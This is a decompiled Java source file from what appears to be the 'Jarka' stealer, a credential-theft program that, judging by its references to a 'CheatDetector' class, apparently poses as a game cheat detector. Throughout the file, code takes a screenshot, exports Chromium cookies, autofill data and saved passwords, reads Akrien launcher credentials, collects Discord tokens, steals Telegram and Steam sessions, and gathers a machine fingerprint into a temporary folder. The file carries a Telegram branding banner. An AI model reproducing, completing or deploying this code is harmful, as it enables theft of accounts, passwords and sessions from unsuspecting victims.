package bro;

import bro.impl.Discord;
import bro.impl.Steam;
import bro.impl.Telegram;
import bro.impl.browsers.Chromium;
import bro.utilities.FileUtils;
import bro.utilities.OSUtility;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Iterator;
import java.util.List;

public class StealerFileWriter {
   public void writeEverything() {
      if (!CheatDetector.TEMP_DIRECTORY.exists()) {
         CheatDetector.TEMP_DIRECTORY.mkdirs();
      }

      BufferedImage var1;
      if ((var1 = OSUtility.getScreenshot()) != null) {
         FileUtils.writeImage(new File(CheatDetector.TEMP_DIRECTORY, "Screenshot.jpg"), var1);
      }

      Chromium.exportCookies();
      Chromium.exportRefills();
      FileUtils.writeText(new File(CheatDetector.TEMP_DIRECTORY, "Passwords.txt"), this.getPasswords());
      FileUtils.writeText(new File(CheatDetector.TEMP_DIRECTORY, "UserInformation.txt"), this.getUserInfo());
      FileUtils.writeText(new File(CheatDetector.TEMP_DIRECTORY, "InstalledSoftware.txt"), OSUtility.getInstalledPrograms());
      FileUtils.writeText(new File(CheatDetector.TEMP_DIRECTORY, "Discord\\Tokens.txt"), Discord.getFormattedTokens());
      Telegram.stealSessions();
      Steam.stealSession();
   }

   public String getPasswords() {
      StringBuilder var1 = getFileHeader();
      File var2 = new File("C:\\AkrienAntiLeak\\auth.data");
      String var4;
      if (var2.exists()) {
         try {
            List var3 = Files.readAllLines(var2.toPath());
            var4 = (String)var3.get(0);
            String var5 = (String)var3.get(1);
            String var6 = "Site: https://akrien.wtf" + System.lineSeparator() + "Login: %s" + System.lineSeparator() + "Password: %s" + System.lineSeparator() + "Source: Akrien Launcher" + System.lineSeparator() + "------------------------------------" + System.lineSeparator();
            var1.append(String.format(var6, var4, var5));
         } catch (IOException var7) {
         }
      }

      Iterator var8 = Chromium.getPasswords().iterator();

      while(var8.hasNext()) {
         var4 = (String)var8.next();
         var1.append(var4);
      }

      return var1.toString();
   }

   public String getUserInfo() {
      StringBuilder var1 = getFileHeader();
      this.appendLn(var1, OSUtility.getFormattedSystemName());
      this.appendLn(var1, "Current JarFile Path: " + CheatDetector.class.getProtectionDomain().getCodeSource().getLocation().getPath().substring(1));
      this.appendLn(var1, OSUtility.getFormattedUserName());
      this.appendLn(var1, "HWID: " + generate());
      this.appendLn(var1, OSUtility.getFormattedIP());
      this.appendLn(var1, OSUtility.getFormattedTimeZone());
      this.appendLn(var1, OSUtility.getFormattedScreenSize());
      this.appendLn(var1, OSUtility.getFormattedLanguage());
      return var1.toString();
   }

   public static String generate() {
      String var0 = String.join("LK", System.getProperty("user.name").trim(), System.getProperty("os.name"), System.getProperty("os.arch"), System.getenv("PROCESSOR_IDENTIFIER"), System.getenv("PROCESSOR_ARCHITECTURE"), System.getenv("PROCESSOR_ARCHITEW6432"), System.getenv("NUMBER_OF_PROCESSORS"));

      try {
         return Base64.getEncoder().encodeToString(MessageDigest.getInstance("MD5").digest(var0.getBytes()));
      } catch (NoSuchAlgorithmException var2) {
         return "Err";
      }
   }

   public static StringBuilder getFileHeader() {
      StringBuilder var0 = new StringBuilder();
      var0.append("$$$$$$__$$$$__$$$$$__$$__$$__$$$$" + System.lineSeparator() + "____$$_$$__$$_$$__$$_$$_$$__$$__$$" + System.lineSeparator() + "____$$_$$$$$$_$$$$$__$$$$___$$$$$$" + System.lineSeparator() + "$$__$$_$$__$$_$$__$$_$$_$$__$$__$$" + System.lineSeparator() + "_$$$$__$$__$$_$$__$$_$$__$$_$$__$$" + System.lineSeparator() + "https://t.me/jarkasteal" + System.lineSeparator() + "" + System.lineSeparator());
      return var0;
   }

   public void appendLn(StringBuilder var1, String var2) {
      var1.append(var2).append(System.lineSeparator());
   }
}
